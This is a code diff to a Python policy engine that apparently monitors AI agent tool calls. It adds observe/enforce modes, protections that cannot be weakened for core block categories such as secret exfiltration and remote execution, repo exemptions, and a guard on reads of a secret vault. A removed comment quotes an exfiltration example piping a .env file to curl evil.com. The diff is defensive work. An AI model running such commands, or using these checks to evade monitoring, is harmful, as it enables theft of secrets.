@@ -7,6 +7,7 @@ evaluates events. Replaces the hardcoded patterns in policies.py.
 from __future__ import annotations
 
 import json
+import os
 import re
 import sys
 from pathlib import Path
@@ -42,6 +43,19 @@ _NON_OVERRIDABLE_RULE_IDS = frozenset({
     "rce-canary",
     "privilege-escalation",
     "dos-resource-exhaustion",
+})
+
+# Categories that must stay in settings.block_categories no matter what an
+# override layer says. Without this clamp, an override that *replaces* the
+# block_categories list could silently downgrade core protections from block
+# to observe even with every core rule still "enabled".
+_CORE_BLOCK_CATEGORIES = frozenset({
+    "destructive_command",
+    "secret_exfiltration",
+    "remote_execution",
+    "rce_canary",
+    "privilege_escalation",
+    "dos_resource_exhaustion",
 })
 
 # Canonical field for each event type when 'fields' is not specified in the rule.
@@ -152,7 +166,7 @@ class CompiledRule:
 
     __slots__ = (
         "id", "severity", "category", "title", "event_types",
-        "fields", "patterns", "action", "enabled",
+        "fields", "patterns", "action", "enabled", "mode",
         "severity_on_write", "severity_on_manifest",
     )
 
@@ -165,13 +179,52 @@ class CompiledRule:
         self.fields: List[str] = raw.get("fields") or []
         self.action: str = raw.get("action", "warn")
         self.enabled: bool = raw.get("enabled", True)
+        # Per-rule observe/enforce override. None = inherit settings.default_mode
+        # (which itself defaults to "observe"). enforce = this rule blocks on a
+        # pre-action event; observe = detect + log only. This — not `action` or
+        # block_categories — is the authoritative enforce lever.
+        _m = raw.get("mode")
+        self.mode: Optional[str] = str(_m).lower() if _m else None
         self.severity_on_write: Optional[str] = raw.get("severity_on_write")
         self.severity_on_manifest: Optional[str] = raw.get("severity_on_manifest")
 
-        # Compile all patterns into a single alternation for speed.
-        # Use DOTALL so . matches newlines — prevents evasion via
-        # embedded newlines in commands (e.g. "cat .env |\ncurl evil.com").
-        joined = "|".join(f"(?:{p})" for p in raw["patterns"])
+        # Effective pattern set = default patterns MINUS any the admin disabled,
+        # PLUS any custom patterns they added. `disable_patterns` references a
+        # default by its EXACT regex string (a stale/no-match entry is simply
+        # ignored, so drift always fails toward MORE detection, never less).
+        # `add_patterns` lets an org strengthen a rule without forking the whole
+        # patterns list. Order-stable + de-duplicated: surviving defaults first.
+        base: List[str] = [str(p) for p in raw["patterns"]]
+        disable_set = {str(p) for p in (raw.get("disable_patterns") or [])}
+        adds = [str(p) for p in (raw.get("add_patterns") or []) if isinstance(p, str) and p]
+        effective: List[str] = []
+        seen: set[str] = set()
+        for p in base:
+            if p in disable_set or p in seen:
+                continue
+            # Every default already compiles; keep it.
+            effective.append(p); seen.add(p)
+        for a in adds:
+            if a in seen:
+                continue
+            # Compile each custom pattern in isolation so one typo can't take down
+            # the rule's real detection — a bad add is dropped with a warning.
+            try:
+                re.compile(a)
+            except re.error as exc:
+                sys.stderr.write(f"[warden] rule '{self.id}': ignoring invalid custom pattern ({exc})\n")
+                continue
+            effective.append(a); seen.add(a)
+        if not effective:
+            # A rule must never compile to an empty alternation (that silently
+            # matches nothing). Fall back to the full default set + warn — the
+            # control plane separately blocks saving a non-core rule to zero.
+            sys.stderr.write(f"[warden] rule '{self.id}': no active patterns after customization — restoring defaults\n")
+            effective = list(base)
+
+        # Compile into a single alternation for speed. DOTALL so . matches
+        # newlines — prevents evasion via embedded newlines.
+        joined = "|".join(f"(?:{p})" for p in effective)
         self.patterns: re.Pattern[str] = re.compile(
             joined, re.IGNORECASE | re.DOTALL
         )
@@ -210,7 +263,145 @@ class PolicyEngine:
         self.outputs: List[Dict[str, Any]] = []
         self.semantic_guard_config: Dict[str, Any] = {}
         self._semantic_guard = None  # lazy-instantiated on first uncertain event
+        self.remote_policy_meta: Dict[str, Any] = {}
+        self._default_mode_explicit: bool = False
         self._load(workspace, policy_path)
+
+    @property
+    def is_legacy_policy(self) -> bool:
+        """True for a policy that predates per-rule observe/enforce: it sets
+        ``block_categories`` but never opts into the new model (no
+        ``settings.default_mode``/``mode`` and no rule-level ``mode``).
+
+        Such a policy keeps its original semantics through the enforce bridge in
+        ``cli.py`` — its ``block_categories`` still block when installed with
+        ``--mode enforce`` — so upgrading an existing install doesn't silently
+        stop blocking. Any policy that adopts the per-rule model (sets a mode
+        anywhere) is fully policy-authoritative and ignores this bridge.
+        """
+        return (
+            bool(self.block_categories)
+            and not self._default_mode_explicit
+            and not any(r.mode for r in self.rules)
+        )
+
+    def _match_exemption(self, workspace: Optional[Path], settings: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Find an admin-granted, non-expired exemption matching this workspace's
+        repo, from the signed bundle's ``settings.repo_exemptions``. Returns the
+        exemption dict (with id/reason/overlay) or None."""
+        if workspace is None:
+            return None
+        exemptions = settings.get("repo_exemptions")
+        if not isinstance(exemptions, list) or not exemptions:
+            return None
+        try:
+            from warden.enterprise import workspace_scope as _scope
+            remote = _scope.detect_git_remote(workspace)
+        except Exception:
+            remote = None
+        if not remote:
+            return None
+        now_iso = _now_iso_z()
+        for ex in exemptions:
+            if not isinstance(ex, dict):
+                continue
+            pattern = str(ex.get("pattern", ""))
+            expires = ex.get("expires")
+            if expires and str(expires) < now_iso:
+                continue  # expired — server should also drop it, but be safe
+            try:
+                from warden.enterprise import workspace_scope as _scope
+                if pattern and _scope._matches(remote, pattern):
+                    return ex
+            except Exception:
+                continue
+        return None
+
+    def _apply_override(
+        self,
+        override_raw: Dict[str, Any],
+        rules_by_id: Dict[str, Dict[str, Any]],
+        allowlist_raw: List[Dict[str, Any]],
+        settings: Dict[str, Any],
+        source: str,
+    ) -> None:
+        """Merge one override layer (project or remote) into the working policy.
+
+        Honors ``_NON_OVERRIDABLE_RULE_IDS`` for every layer: no override —
+        local project *or* signed remote — may disable or weaken a core rule.
+        Overrides may strengthen them (e.g. add patterns) and may freely add or
+        replace non-core rules. Settings are merged key-by-key, so a later layer
+        wins (remote is applied after project = org-admin authoritative).
+        """
+        for rule in override_raw.get("rules", []) or []:
+            rule_id = rule.get("id", "")
+            if rule_id in _NON_OVERRIDABLE_RULE_IDS:
+                if not rule.get("enabled", True):
+                    sys.stderr.write(
+                        f"[warden] Ignoring {source} override for non-overridable "
+                        f"rule '{rule_id}' (cannot be disabled)\n"
+                    )
+                    continue
+                default = rules_by_id.get(rule_id)
+                if default:
+                    merged = {**default, **rule}
+                    merged["enabled"] = True  # force enabled
+                    # Core protections are ADD-ONLY: their default patterns can
+                    # never be replaced or disabled, only extended.
+                    merged["patterns"] = default["patterns"]  # block full-replace neuter
+                    if merged.pop("disable_patterns", None) is not None:
+                        sys.stderr.write(
+                            f"[warden] Ignoring disable_patterns on core rule '{rule_id}' (cannot be weakened)\n"
+                        )
+                    # Union add_patterns across layers (strengthen-only), so a later
+                    # layer can't silently drop an earlier layer's custom detections.
+                    _adds = list(dict.fromkeys([*(default.get("add_patterns") or []), *(rule.get("add_patterns") or [])]))
+                    if _adds:
+                        merged["add_patterns"] = _adds
+                    rules_by_id[rule_id] = merged
+                    continue
+            # Field-level merge so a sparse overlay (e.g. just {id, mode: enforce})
+            # flips one field without dropping the rule's patterns/category. A full
+            # overlay rule still fully overrides — every key it provides wins.
+            existing = rules_by_id.get(rule["id"])
+            if isinstance(existing, dict):
+                merged = {**existing, **rule}
+                # add_patterns/disable_patterns are UNIONED across layers (project
+                # < remote < exemption), not last-writer-wins — otherwise a later
+                # layer would silently wipe an earlier layer's custom patterns.
+                for _k in ("add_patterns", "disable_patterns"):
+                    _u = list(dict.fromkeys([*(existing.get(_k) or []), *(rule.get(_k) or [])]))
+                    if _u:
+                        merged[_k] = _u
+                rules_by_id[rule["id"]] = merged
+            else:
+                # No existing rule with this id. Treat it as a brand-new rule only
+                # if it's a complete definition; a sparse entry (e.g. just
+                # {id, mode: enforce}) that names a rule which doesn't exist is a
+                # typo/no-op — ignore it with a warning rather than crash the
+                # compile on missing required fields (fail-open hazard).
+                _required = ("severity", "category", "title", "event_types")
+                _missing = [k for k in _required if k not in rule]
+                if _missing:
+                    sys.stderr.write(
+                        f"[warden] Ignoring {source} override for unknown rule "
+                        f"'{rule.get('id', '')}' (no such rule to override; not a "
+                        f"complete new rule — missing {', '.join(_missing)})\n"
+                    )
+                    continue
+                rules_by_id[rule["id"]] = rule
+        allowlist_raw.extend(override_raw.get("allowlists", []) or [])
+        override_settings = dict(override_raw.get("settings", {}) or {})
+        if "block_categories" in override_settings:
+            cats = set(override_settings.get("block_categories") or [])
+            dropped = _CORE_BLOCK_CATEGORIES - cats
+            if dropped:
+                sys.stderr.write(
+                    f"[warden] {source} override dropped core block categories "
+                    f"{sorted(dropped)} — restoring (cannot be weakened)\n"
+                )
+                override_settings["block_categories"] = sorted(cats | _CORE_BLOCK_CATEGORIES)
+        settings.update(override_settings)
 
     def _load(self, workspace: Optional[Path], policy_path: Optional[Path]) -> None:
         default_raw = _load_yaml(_DEFAULT_POLICY_PATH)
@@ -237,32 +428,58 @@ class PolicyEngine:
         if override_path is not None and override_path.exists():
             override_raw = _load_yaml(override_path)
             if override_raw is not None:
-                for rule in override_raw.get("rules", []):
-                    rule_id = rule.get("id", "")
-                    if rule_id in _NON_OVERRIDABLE_RULE_IDS:
-                        # Check if the override attempts to disable or weaken.
-                        if not rule.get("enabled", True):
-                            sys.stderr.write(
-                                f"[warden] Ignoring project-level override for "
-                                f"non-overridable rule '{rule_id}' "
-                                f"(cannot be disabled by project policy)\n"
-                            )
-                            continue
-                        # Allow strengthening (e.g. adding patterns) but preserve
-                        # the default rule as the base.
-                        default = rules_by_id.get(rule_id)
-                        if default:
-                            merged = {**default, **rule}
-                            merged["enabled"] = True  # force enabled
-                            rules_by_id[rule_id] = merged
-                            continue
-                    rules_by_id[rule["id"]] = rule  # override by id
-                allowlist_raw.extend(override_raw.get("allowlists", []) or [])
-                # Project settings override defaults key-by-key.
-                settings.update(override_raw.get("settings", {}) or {})
+                self._apply_override(override_raw, rules_by_id, allowlist_raw, settings, "project")
+
+        # Merge signed, org-managed remote policy (enterprise control plane).
+        # Applied AFTER the project layer so an org admin's policy is
+        # authoritative for settings, but the same non-overridable floor below
+        # protects core rules — a remote policy can tighten, never weaken.
+        # Per-workspace scoping: the org (remote) policy overlay — which also
+        # carries the org telemetry sink — applies ONLY to org-managed
+        # workspaces (company/client repos). Personal/local-only workspaces use
+        # default + project policy only: still fully protected locally, but no
+        # org policy and nothing reported to the org. The non-weakening floor is
+        # unaffected (it lives in the default policy, always on).
+        self.remote_policy_meta: Dict[str, Any] = {}
+        self.workspace_managed: bool = False
+        try:
+            from warden.enterprise import workspace_scope as _scope
+            self.workspace_managed = _scope.is_managed(workspace)
+        except Exception:
+            self.workspace_managed = False
+        self.active_exemption: Optional[Dict[str, Any]] = None
+        if self.workspace_managed:
+            try:
+                from warden.enterprise import remote_policy as _remote
+                remote_raw = _remote.verify_and_load()
+                if remote_raw is not None:
+                    self.remote_policy_meta = remote_raw.pop("_remote_meta", {}) or {}
+                    self._apply_override(remote_raw, rules_by_id, allowlist_raw, settings, "remote")
+            except Exception as _remote_exc:  # never let policy distribution break enforcement
+                sys.stderr.write(f"[warden] remote policy load error: {_remote_exc}\n")
+
+            # Layered policy: after the org overlay, apply a repo-scoped EXEMPTION
+            # if the admin granted one for this repo. Exemptions can relax only
+            # non-floor rules — they go through the SAME _apply_override that
+            # enforces _NON_OVERRIDABLE_RULE_IDS + core block categories, so an
+            # exemption can never weaken core protection. The matched exemption
+            # id is recorded so telemetry shows the repo is running relaxed.
+            self.active_exemption = self._match_exemption(workspace, settings)
+            if self.active_exemption is not None:
+                overlay = self.active_exemption.get("overlay") or {}
+                if isinstance(overlay, dict):
+                    self._apply_override(overlay, rules_by_id, allowlist_raw, settings, "exemption")
 
         # Compile settings.
         self.block_categories = set(settings.get("block_categories", []))
+        # Global observe/enforce default for rules that don't set their own mode.
+        # Defaults to "observe" — a fresh policy blocks nothing until an admin
+        # flips rules (or this) to enforce.
+        _dm = settings.get("default_mode") or settings.get("mode") or "observe"
+        self.default_mode: str = str(_dm).lower()
+        # Did the operator explicitly adopt the per-rule observe/enforce model?
+        # Used by the backward-compat enforce bridge (see is_legacy_policy).
+        self._default_mode_explicit: bool = ("default_mode" in settings) or ("mode" in settings)
         outputs = settings.get("outputs") or []
         if isinstance(outputs, list):
             self.outputs = [o for o in outputs if isinstance(o, dict)]
@@ -355,6 +572,10 @@ class PolicyEngine:
                 "eventIndex": index,
                 "ruleId": rule.id,
                 "action": rule.action,
+                # Effective observe/enforce for this finding — per-rule override
+                # else the policy's default_mode. should_block() blocks only when
+                # this is "enforce".
+                "mode": rule.mode or self.default_mode,
             })
 
         # ── Canarytoken access check ────────────────────────────────────
@@ -383,6 +604,48 @@ class PolicyEngine:
                         beacon(hit, f"canary-{event_type}", {"session": session_id})
                 except Exception:
                     pass
+
+        # ── Prismor vault access guard ──────────────────────────────────
+        # The plaintext secret vault (~/.prismor/secrets, or wherever
+        # PRISMOR_SECRETS_DIR points) must never be touched by an agent tool
+        # call. Resolving the live path honors env overrides that a static
+        # YAML pattern would silently miss. Cloaking's own decloak/recloak
+        # hooks read the vault via bash `cat` outside hook-dispatch, so they
+        # never reach evaluate() — only an agent reading the vault trips this.
+        try:
+            from warden.cloaking.secrets_store import secrets_dir as _secrets_dir
+            # normpath+expanduser (not resolve) so both sides normalize the same
+            # way — avoids symlink mismatches like macOS /var → /private/var.
+            _vault = os.path.normpath(os.path.expanduser(str(_secrets_dir())))
+        except Exception:
+            _vault = ""
+        if _vault:
+            _hit_vault = None
+            if event_type in ("file_read", "file_write"):
+                _p = field_values.get("path", "")
+                if _p:
+                    _np = os.path.normpath(os.path.expanduser(_p.split("\n", 1)[0]))
+                    if _np == _vault or _np.startswith(_vault + os.sep):
+                        _hit_vault = _p
+            elif event_type == "shell":
+                _cmd = field_values.get("command", "")
+                # ".prismor/secrets" matches every expansion form of the default
+                # location (~/, $HOME/, absolute); _vault matches a custom dir.
+                if _cmd and (".prismor/secrets" in _cmd or _vault in _cmd):
+                    _hit_vault = _cmd
+            if _hit_vault is not None:
+                finding_id = f"prismor-vault-access-{index}"
+                prefixed_id = f"{session_id}:{finding_id}" if session_id else finding_id
+                findings.append({
+                    "id": prefixed_id,
+                    "severity": "CRITICAL",
+                    "category": "secret_access",
+                    "title": "Access to Prismor plaintext secret vault",
+                    "evidence": _truncate(_hit_vault),
+                    "eventIndex": index,
+                    "ruleId": "prismor-vault-access",
+                    "action": "block",
+                })
 
         # Canary marker found in tool stdout/stderr (PostToolUse content
         # scanning) — catches the case where the canary is read indirectly.
@@ -912,6 +1175,11 @@ def _truncate(value: str, max_length: int = 220) -> str:
     return text if len(text) <= max_length else f"{text[:max_length - 3]}..."
 
 
+def _now_iso_z() -> str:
+    from datetime import datetime, timezone
+    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+
+
 def _load_yaml(path: Path) -> Optional[Dict[str, Any]]:
     """Load a YAML file. Falls back to basic parsing if PyYAML is missing."""
     if not path.exists():
@@ -947,11 +1215,20 @@ def validate_policy(path: Path) -> List[str]:
     seen_ids: set[str] = set()
     for i, rule in enumerate(raw.get("rules", [])):
         prefix = f"rules[{i}]"
-        for field in ("id", "severity", "category", "title", "event_types", "patterns", "action"):
-            if field not in rule:
-                errors.append(f"{prefix}: missing required field '{field}'")
-
         rule_id = rule.get("id", "")
+        # A rule is either FULL (defines its own patterns) or a sparse OVERLAY
+        # customization of a default rule ({id} + mode/add_patterns/disable_patterns).
+        is_overlay = "patterns" not in rule and (
+            "add_patterns" in rule or "disable_patterns" in rule or "mode" in rule
+        )
+        if is_overlay:
+            if "id" not in rule:
+                errors.append(f"{prefix}: missing required field 'id'")
+        else:
+            for field in ("id", "severity", "category", "title", "event_types", "patterns", "action"):
+                if field not in rule:
+                    errors.append(f"{prefix}: missing required field '{field}'")
+
         if rule_id in seen_ids:
             errors.append(f"{prefix}: duplicate rule id '{rule_id}'")
         seen_ids.add(rule_id)
@@ -961,6 +1238,20 @@ def validate_policy(path: Path) -> List[str]:
                 re.compile(pattern)
             except re.error as e:
                 errors.append(f"{prefix}.patterns[{j}]: invalid regex: {e}")
+
+        # Custom added patterns must compile.
+        for j, pattern in enumerate(rule.get("add_patterns", []) or []):
+            try:
+                re.compile(str(pattern))
+            except re.error as e:
+                errors.append(f"{prefix}.add_patterns[{j}]: invalid regex: {e}")
+
+        # Core protections are add-only: their patterns can't be disabled.
+        # (Replacing a core rule's patterns is blocked at merge time + by the
+        # control-plane overlay validator; the default policy file legitimately
+        # defines core patterns, so we don't flag `patterns` here.)
+        if rule_id in _NON_OVERRIDABLE_RULE_IDS and rule.get("disable_patterns"):
+            errors.append(f"{prefix}: rule '{rule_id}' is a core protection — disable_patterns is not allowed")
 
         action = rule.get("action", "")
         if action and action not in ("block", "warn", "log"):
